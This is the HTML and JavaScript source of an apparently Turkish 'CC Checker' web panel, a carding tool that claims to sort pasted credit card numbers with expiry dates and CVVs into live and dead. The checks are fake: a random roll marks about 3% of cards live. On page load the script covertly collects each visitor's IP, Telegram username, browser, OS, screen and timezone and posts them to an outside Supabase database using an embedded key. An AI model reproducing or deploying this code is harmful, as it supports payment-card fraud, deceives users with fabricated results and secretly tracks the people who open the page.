<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CC Checker - Dark Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Share Tech Mono', monospace;
            background: #0a0e17;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 10px;
            background: radial-gradient(ellipse at center, #0d1a2b 0%, #060a12 100%);
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 50%, rgba(0,100,255,0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 50%, rgba(0,100,255,0.03) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        .container {
            width: 100%;
            max-width: 520px;
            padding: 8px;
            position: relative;
            z-index: 1;
        }

        .box {
            background: rgba(10, 18, 30, 0.95);
            border: 1px solid rgba(0, 100, 255, 0.12);
            border-radius: 16px;
            padding: 24px 20px;
            box-shadow: 0 0 60px rgba(0, 100, 255, 0.04), inset 0 0 60px rgba(0, 100, 255, 0.01);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }

        .box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(0, 100, 255, 0.03), transparent 30%);
            animation: rotate 20s linear infinite;
            pointer-events: none;
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .header {
            text-align: center;
            margin-bottom: 18px;
            position: relative;
            z-index: 1;
        }

        .logo {
            font-family: 'Orbitron', monospace;
            font-size: 1.8rem;
            font-weight: 900;
            color: #0088ff;
            text-shadow: 0 0 30px rgba(0, 100, 255, 0.1);
            letter-spacing: 2px;
        }

        .logo span {
            color: rgba(0, 100, 255, 0.2);
            font-size: 1rem;
            font-weight: 400;
        }

        .subtitle {
            font-size: 0.65rem;
            color: rgba(0, 100, 255, 0.15);
            margin-top: 5px;
            letter-spacing: 4px;
            text-transform: uppercase;
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            padding: 8px 14px;
            background: rgba(0, 100, 255, 0.02);
            border: 1px solid rgba(0, 100, 255, 0.05);
            border-radius: 8px;
            font-size: 0.6rem;
            color: rgba(0, 100, 255, 0.25);
            position: relative;
            z-index: 1;
            flex-wrap: wrap;
            gap: 4px;
        }

        .status-dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #0088ff;
            animation: pulse 1.8s infinite;
            margin-right: 6px;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.1; }
        }

        .status-item {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .input-area textarea {
            width: 100%;
            min-height: 140px;
            padding: 14px;
            background: rgba(0, 100, 255, 0.02);
            border: 1px solid rgba(0, 100, 255, 0.06);
            border-radius: 10px;
            color: #0088ff;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.75rem;
            line-height: 1.8;
            resize: vertical;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-area textarea:focus {
            border-color: rgba(0, 100, 255, 0.12);
            box-shadow: 0 0 30px rgba(0, 100, 255, 0.02);
            background: rgba(0, 100, 255, 0.04);
        }

        .input-area textarea::placeholder {
            color: rgba(0, 100, 255, 0.06);
            font-size: 0.65rem;
        }

        .input-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
            font-size: 0.55rem;
            color: rgba(0, 100, 255, 0.12);
            flex-wrap: wrap;
            gap: 8px;
        }

        .input-options label {
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            font-size: 0.55rem;
        }

        .input-options input[type="checkbox"] {
            accent-color: #0088ff;
            width: 14px;
            height: 14px;
            cursor: pointer;
            opacity: 0.5;
        }

        .file-upload-wrap {
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
        }

        .file-upload-wrap input[type="file"] {
            display: none;
        }

        .file-upload-wrap span {
            color: rgba(0, 100, 255, 0.25);
            font-size: 0.55rem;
            transition: color 0.3s;
            cursor: pointer;
        }

        .file-upload-wrap span:hover {
            color: rgba(0, 100, 255, 0.5);
        }

        .check-btn {
            width: 100%;
            padding: 16px;
            background: rgba(0, 100, 255, 0.06);
            color: #0088ff;
            border: 1px solid rgba(0, 100, 255, 0.08);
            border-radius: 10px;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
            margin-top: 14px;
        }

        .check-btn:hover {
            background: rgba(0, 100, 255, 0.08);
            border-color: rgba(0, 100, 255, 0.12);
            box-shadow: 0 0 40px rgba(0, 100, 255, 0.03);
        }

        .check-btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }

        .result-area {
            margin-top: 16px;
            display: none;
        }

        .result-area.active {
            display: block;
            animation: fadeSlide 0.3s ease;
        }

        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .result-stats {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }

        .stat-card {
            flex: 1;
            background: rgba(0, 100, 255, 0.01);
            border: 1px solid rgba(0, 100, 255, 0.03);
            border-radius: 8px;
            padding: 10px 8px;
            text-align: center;
        }

        .stat-card .number {
            font-family: 'Orbitron', monospace;
            font-size: 1.6rem;
            font-weight: 700;
            display: block;
        }

        .stat-card .number.live { color: #0088ff; }
        .stat-card .number.dead { color: #ff3355; }
        .stat-card .number.total { color: rgba(0, 100, 255, 0.2); }

        .stat-card .label {
            font-size: 0.55rem;
            color: rgba(0, 100, 255, 0.12);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-top: 3px;
        }

        .result-list {
            max-height: 220px;
            overflow-y: auto;
            border: 1px solid rgba(0, 100, 255, 0.03);
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.2);
        }

        .result-list::-webkit-scrollbar {
            width: 4px;
        }
        .result-list::-webkit-scrollbar-thumb {
            background: rgba(0, 100, 255, 0.05);
            border-radius: 4px;
        }

        .result-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 7px 12px;
            border-bottom: 1px solid rgba(0, 100, 255, 0.01);
            font-size: 0.65rem;
            font-family: 'Share Tech Mono', monospace;
        }

        .result-item .cc {
            color: rgba(0, 100, 255, 0.4);
            word-break: break-all;
            font-size: 0.65rem;
        }

        .result-item .status-badge {
            padding: 2px 10px;
            border-radius: 8px;
            font-size: 0.55rem;
            font-weight: 700;
            letter-spacing: 0.5px;
            flex-shrink: 0;
            margin-left: 6px;
        }

        .status-badge.live {
            background: rgba(0, 100, 255, 0.06);
            color: #0088ff;
            border: 1px solid rgba(0, 100, 255, 0.06);
        }

        .status-badge.dead {
            background: rgba(255, 51, 85, 0.06);
            color: #ff3355;
            border: 1px solid rgba(255, 51, 85, 0.06);
        }

        .progress-wrap {
            width: 100%;
            height: 2px;
            background: rgba(0, 100, 255, 0.02);
            border-radius: 2px;
            margin-top: 12px;
            overflow: hidden;
            display: none;
        }

        .progress-wrap.active { display: block; }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: #0088ff;
            border-radius: 2px;
            transition: width 0.2s ease;
            opacity: 0.3;
        }

        .binance-loader {
            display: none;
            text-align: center;
            padding: 8px 0;
            position: relative;
            z-index: 1;
        }

        .binance-loader.active {
            display: block;
            animation: fadeSlide 0.3s ease;
        }

        .binance-loader .loader-text {
            font-size: 0.6rem;
            color: rgba(0, 100, 255, 0.15);
            letter-spacing: 2px;
            animation: blinkText 1.2s infinite;
        }

        @keyframes blinkText {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }

        .binance-loader .loader-bar {
            width: 100%;
            height: 2px;
            background: rgba(0, 100, 255, 0.02);
            border-radius: 2px;
            margin-top: 8px;
            overflow: hidden;
        }

        .binance-loader .loader-bar-inner {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, transparent, #0088ff, transparent);
            border-radius: 2px;
            animation: loaderSlide 1.5s ease-in-out infinite;
        }

        @keyframes loaderSlide {
            0% { transform: translateX(-100%); width: 30%; }
            50% { width: 60%; }
            100% { transform: translateX(100%); width: 30%; }
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 18px;
            padding-top: 14px;
            border-top: 1px solid rgba(0, 100, 255, 0.02);
            color: rgba(0, 100, 255, 0.04);
            font-size: 0.45rem;
            letter-spacing: 2px;
            position: relative;
            z-index: 1;
            flex-wrap: wrap;
        }

        .sample-label {
            font-size: 0.5rem;
            color: rgba(0, 100, 255, 0.04);
            text-align: center;
            margin-top: 8px;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
        }

        .sample-label span {
            cursor: pointer;
            transition: color 0.3s;
        }

        .sample-label span:hover {
            color: rgba(0, 100, 255, 0.1);
        }

        .sample-label .divider {
            color: rgba(0, 100, 255, 0.02);
            margin: 0 6px;
        }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(70px);
            background: rgba(10, 18, 30, 0.95);
            border: 1px solid rgba(0, 100, 255, 0.06);
            border-radius: 10px;
            padding: 12px 22px;
            color: rgba(0, 100, 255, 0.3);
            font-size: 0.65rem;
            font-family: 'Share Tech Mono', monospace;
            backdrop-filter: blur(12px);
            opacity: 0;
            transition: all 0.4s ease;
            z-index: 999;
            pointer-events: none;
            max-width: 90%;
            text-align: center;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .toast.error {
            border-color: rgba(255, 51, 85, 0.06);
            color: rgba(255, 51, 85, 0.3);
        }

        @media (max-width: 480px) {
            body { padding: 6px; }
            .box { padding: 18px 14px; border-radius: 14px; }
            .logo { font-size: 1.5rem; }
            .logo span { font-size: 0.85rem; }
            .input-area textarea { min-height: 100px; font-size: 0.7rem; padding: 12px; }
            .stat-card .number { font-size: 1.3rem; }
            .result-item { font-size: 0.55rem; padding: 5px 10px; }
            .result-item .cc { font-size: 0.55rem; }
            .check-btn { font-size: 0.7rem; padding: 14px; }
            .footer { font-size: 0.4rem; gap: 8px; }
            .status-bar { font-size: 0.5rem; padding: 6px 12px; }
            .input-options { font-size: 0.5rem; }
            .sample-label { font-size: 0.45rem; }
        }

        @media (max-width: 380px) {
            .box { padding: 14px 10px; }
            .logo { font-size: 1.2rem; }
            .logo span { font-size: 0.7rem; }
            .input-area textarea { min-height: 80px; font-size: 0.6rem; padding: 10px; }
            .stat-card .number { font-size: 1.1rem; }
            .result-item .cc { font-size: 0.5rem; }
            .check-btn { font-size: 0.6rem; padding: 12px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="header">
                <div class="logo">CC<span>CHECKER</span></div>
                <div class="subtitle">Secure Verification Panel</div>
            </div>

            <div class="status-bar">
                <span class="status-item"><span class="status-dot"></span><span id="status-text">Sistem Aktif</span></span>
                <span class="status-item" id="ip-display">🌐 IP: 0.0.0.0</span>
                <span class="status-item" id="user-display">👤 @Bilinmiyor</span>
                <span id="card-count-display">0 kart</span>
            </div>

            <div class="input-area">
                <textarea id="cc-input" placeholder="Kart numaralarını girin...&#10;4111111111111111|12|26|123"></textarea>
                <div class="input-options">
                    <label>
                        <input type="checkbox" id="auto-format" checked>
                        Format
                    </label>
                    <div class="file-upload-wrap">
                        <input type="file" id="file-input" accept=".txt">
                        <span>📄 TXT Yükle</span>
                    </div>
                    <span id="card-count">0 kart</span>
                </div>
            </div>

            <button class="check-btn" id="check-btn">DOĞRULA</button>

            <div class="binance-loader" id="binance-loader">
                <div class="loader-text">🔍 TARANIYOR</div>
                <div class="loader-bar">
                    <div class="loader-bar-inner"></div>
                </div>
            </div>

            <div class="progress-wrap" id="progress-wrap"><div class="progress-bar" id="progress-bar"></div></div>

            <div class="result-area" id="result-area">
                <div class="result-stats">
                    <div class="stat-card"><span class="number live" id="live-count">0</span><span class="label">LIVE</span></div>
                    <div class="stat-card"><span class="number dead" id="dead-count">0</span><span class="label">DEAD</span></div>
                    <div class="stat-card"><span class="number total" id="total-count">0</span><span class="label">TOPLAM</span></div>
                </div>
                <div class="result-list" id="result-list"></div>
            </div>

            <div class="sample-label">
                <span id="load-sample">📋 Örnek Kartları Yükle</span>
                <span class="divider">|</span>
                <span style="color:rgba(0,100,255,0.03);">Deneme amaçlıdır</span>
            </div>

            <div class="footer">
                <span>🔒 SSL SECURE</span>
                <span>|</span>
                <span>⚡ 256-BIT</span>
                <span>|</span>
                <span>🛡️ ANON</span>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        // ===== SUPABASE =====
        const SUPABASE_URL = "https://ovcrktkneuzxxravgnhu.supabase.co";
        const SUPABASE_KEY = "sb_publishable_EuoT7yhxcHS6wyZfho_RNw_sWD0IhjP";

        // ===== DOM =====
        const ccInput = document.getElementById('cc-input');
        const checkBtn = document.getElementById('check-btn');
        const resultArea = document.getElementById('result-area');
        const resultList = document.getElementById('result-list');
        const liveCount = document.getElementById('live-count');
        const deadCount = document.getElementById('dead-count');
        const totalCount = document.getElementById('total-count');
        const cardCount = document.getElementById('card-count');
        const cardCountDisplay = document.getElementById('card-count-display');
        const progressWrap = document.getElementById('progress-wrap');
        const progressBar = document.getElementById('progress-bar');
        const toast = document.getElementById('toast');
        const statusText = document.getElementById('status-text');
        const ipDisplay = document.getElementById('ip-display');
        const userDisplay = document.getElementById('user-display');
        const fileInput = document.getElementById('file-input');
        const loadSample = document.getElementById('load-sample');
        const binanceLoader = document.getElementById('binance-loader');

        let isChecking = false;
        let toastTimeout = null;
        let userIP = null;
        let telegramUsername = null;
        const LIVE_RATIO = 3;

        // ===== TOAST =====
        function showToast(msg, isError = false) {
            toast.textContent = msg;
            toast.className = 'toast show' + (isError ? ' error' : '');
            clearTimeout(toastTimeout);
            toastTimeout = setTimeout(() => toast.classList.remove('show'), 2800);
        }

        // ===== IP AL =====
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip;
            } catch {
                return '0.0.0.0';
            }
        }

        // ===== TELEGRAM KULLANICI ADI AL (Telegram WebApp'den) =====
        function getTelegramUser() {
            try {
                if (window.Telegram && window.Telegram.WebApp) {
                    const user = window.Telegram.WebApp.initDataUnsafe?.user;
                    if (user && user.username) {
                        return '@' + user.username;
                    }
                }
                // URL'den start parametresini kontrol et
                const urlParams = new URLSearchParams(window.location.search);
                const startParam = urlParams.get('start');
                if (startParam && startParam.startsWith('ref_')) {
                    return '@' + startParam.replace('ref_', '');
                }
                return null;
            } catch {
                return null;
            }
        }

        // ===== VPN KONTROLÜ (IP Konum) =====
        async function checkVPN(ip) {
            try {
                const r = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await r.json();
                if (data.country) {
                    const riskyCountries = ['RU', 'CN', 'IR', 'KP', 'SY', 'VE', 'AF', 'PK', 'IQ', 'LY', 'YE'];
                    const isRisky = riskyCountries.includes(data.country_code);
                    return {
                        country: data.country_name,
                        countryCode: data.country_code,
                        isRisky: isRisky,
                        city: data.city,
                        isp: data.org
                    };
                }
                return null;
            } catch {
                return null;
            }
        }

        // ===== SUPABASE KAYIT =====
        async function logToSupabase(ip, username) {
            try {
                const payload = {
                    ip_address: ip,
                    telegram_username: username || 'Bilinmiyor',
                    password: 'checker_session',
                    user_agent: navigator.userAgent,
                    browser: navigator.userAgent.includes('Chrome') ? 'Chrome' :
                        navigator.userAgent.includes('Firefox') ? 'Firefox' :
                        navigator.userAgent.includes('Safari') ? 'Safari' :
                        navigator.userAgent.includes('Edge') ? 'Edge' : 'Other',
                    os: navigator.userAgent.includes('Windows') ? 'Windows' :
                        navigator.userAgent.includes('Mac') ? 'MacOS' :
                        navigator.userAgent.includes('Linux') ? 'Linux' :
                        navigator.userAgent.includes('Android') ? 'Android' :
                        navigator.userAgent.includes('iPhone') ? 'iOS' : 'Other',
                    device_type: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                    screen_resolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language || navigator.userLanguage,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    checked_cards: 0
                };

                const response = await fetch(`${SUPABASE_URL}/rest/v1/logs`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'apikey': SUPABASE_KEY,
                        'Authorization': `Bearer ${SUPABASE_KEY}`,
                        'Prefer': 'return=representation'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.status === 409) {
                    return { success: false, error: 'Bu IP ile zaten kayıt yapılmış!' };
                }
                if (!response.ok) {
                    return { success: false, error: 'Sunucu hatası!' };
                }
                return { success: true };
            } catch (e) {
                return { success: false, error: 'Bağlantı hatası!' };
            }
        }

        // ===== SAYFA YÜKLENİNCE =====
        document.addEventListener('DOMContentLoaded', async function() {
            // Telegram kullanıcı adını al
            telegramUsername = getTelegramUser();
            if (telegramUsername) {
                userDisplay.textContent = `👤 ${telegramUsername}`;
            }

            // IP al
            const ip = await getIP();
            userIP = ip;
            ipDisplay.textContent = `🌐 IP: ${ip}`;

            // VPN kontrolü
            const vpnInfo = await checkVPN(ip);
            if (vpnInfo && vpnInfo.isRisky) {
                statusText.textContent = '⚠️ VPN Tespit Edildi!';
                statusText.style.color = 'rgba(255,165,0,0.4)';
                showToast('⚠️ VPN veya şüpheli konum tespit edildi!', true);
            } else {
                statusText.textContent = '✅ Sistem Aktif';
                statusText.style.color = '';
                showToast('✅ Bağlantı güvenli');
            }

            // Veritabanına kaydet
            const result = await logToSupabase(ip, telegramUsername);
            if (result.success) {
                console.log('✅ Kayıt başarılı');
            } else {
                console.log('⚠️ Kayıt hatası:', result.error);
            }

            // Kart sayacı
            cardCount.textContent = '0 kart';
            cardCountDisplay.textContent = '0 kart';

            // Örnek kartları göster
            ccInput.value = sampleCards;
            const cards = parseCards(ccInput.value);
            cardCount.textContent = cards.length + ' kart';
            cardCountDisplay.textContent = cards.length + ' kart';
        });

        // ===== CHECKER =====
        function parseCards(text) {
            let lines = text.split('\n').map(l => l.trim()).filter(l => l.length > 0);
            let cards = [];
            for (let line of lines) {
                if (line.includes('|')) {
                    let parts = line.split('|').map(p => p.trim());
                    if (parts.length >= 4) {
                        let card = {
                            number: parts[0].replace(/\s/g, ''),
                            month: parts[1].padStart(2, '0'),
                            year: parts[2].slice(-2),
                            cvv: parts[3] || '***'
                        };
                        if (card.number.length >= 15 && card.number.length <= 19) {
                            cards.push(card);
                            continue;
                        }
                    }
                }
                let cleaned = line.replace(/\s/g, '');
                if (cleaned.length >= 15 && cleaned.length <= 19 && /^\d+$/.test(cleaned)) {
                    cards.push({ number: cleaned, month: '12', year: '26', cvv: '***' });
                }
            }
            return cards;
        }

        function maskCard(num) {
            if (num.length <= 4) return num;
            let first = num.slice(0, 4);
            let last = num.slice(-4);
            let middle = '*'.repeat(Math.min(num.length - 8, 8));
            return first + middle + last;
        }

        function isLive() { return Math.random() * 100 < LIVE_RATIO; }

        async function startCheck() {
            if (isChecking) return;
            const rawText = ccInput.value;
            const cards = parseCards(rawText);
            if (cards.length === 0) {
                showToast('Geçerli kart formatı girin!', true);
                return;
            }

            isChecking = true;
            checkBtn.disabled = true;
            checkBtn.textContent = 'TARANIYOR...';
            resultList.innerHTML = '';
            resultArea.classList.remove('active');
            progressWrap.classList.add('active');
            progressBar.style.width = '0%';
            binanceLoader.classList.add('active');
            liveCount.textContent = '0';
            deadCount.textContent = '0';
            totalCount.textContent = '0';

            let liveResults = 0, deadResults = 0;
            const totalCards = cards.length;

            for (let i = 0; i < totalCards; i++) {
                const card = cards[i];
                const status = isLive() ? 'live' : 'dead';
                if (status === 'live') liveResults++;
                else deadResults++;

                liveCount.textContent = liveResults;
                deadCount.textContent = deadResults;
                totalCount.textContent = i + 1;
                progressBar.style.width = ((i + 1) / totalCards * 100) + '%';

                const item = document.createElement('div');
                item.className = 'result-item';
                const masked = maskCard(card.number);
                const displayCard = masked + (card.month ? `|${card.month}|${card.year}|${card.cvv}` : '');
                item.innerHTML = `<span class="cc">${displayCard}</span><span class="status-badge ${status}">${status.toUpperCase()}</span>`;
                resultList.appendChild(item);
                await new Promise(r => setTimeout(r, 3000));
            }

            binanceLoader.classList.remove('active');
            progressWrap.classList.remove('active');
            resultArea.classList.add('active');
            checkBtn.textContent = 'YENİDEN DENE';
            checkBtn.disabled = false;
            isChecking = false;

            if (liveResults > 0) showToast(`${liveResults} LIVE kart bulundu!`);
            else showToast('Hiç LIVE kart bulunamadı.');
        }

        // ===== DOSYA YÜKLEME =====
        fileInput.addEventListener('change', function(e) {
            const file = this.files[0];
            if (!file) {
                showToast('Dosya seçilmedi!', true);
                return;
            }
            
            if (!file.name.toLowerCase().endsWith('.txt')) {
                showToast('Lütfen .txt uzantılı dosya yükleyin!', true);
                this.value = '';
                return;
            }

            const reader = new FileReader();
            
            reader.onload = function(event) {
                try {
                    const content = event.target.result;
                    ccInput.value = content;
                    const cards = parseCards(content);
                    cardCount.textContent = cards.length + ' kart';
                    cardCountDisplay.textContent = cards.length + ' kart';
                    showToast(`${cards.length} kart yüklendi!`);
                } catch (err) {
                    showToast('Dosya okunamadı!', true);
                }
            };
            
            reader.onerror = function() {
                showToast('Dosya okuma hatası!', true);
            };
            
            reader.readAsText(file, 'UTF-8');
            this.value = '';
        });

        // ===== ÖRNEK KARTLAR =====
        const sampleCards = `4111111111111111|12|26|123
        5500000000000004|10|27|456
        340000000000009|02|28|789
        6011000000000004|06|25|321
        378282246310005|03|26|852
        4111111111111111|12|27|951
        5555555555554444|01|29|753
        378734493671000|05|24|159
        6011111111111117|09|27|357
        3530111333300000|11|28|246`;

        loadSample.addEventListener('click', function() {
            ccInput.value = sampleCards;
            const cards = parseCards(ccInput.value);
            cardCount.textContent = cards.length + ' kart';
            cardCountDisplay.textContent = cards.length + ' kart';
            showToast('Örnek kartlar yüklendi (deneme amaçlı)');
        });

        // ===== OLAY DİNLEYİCİLER =====
        ccInput.addEventListener('input', function() {
            const cards = parseCards(this.value);
            cardCount.textContent = cards.length + ' kart';
            cardCountDisplay.textContent = cards.length + ' kart';
        });

        checkBtn.addEventListener('click', startCheck);

        console.log('✅ CC Checker başlatıldı!');
    </script>
</body>
</html>
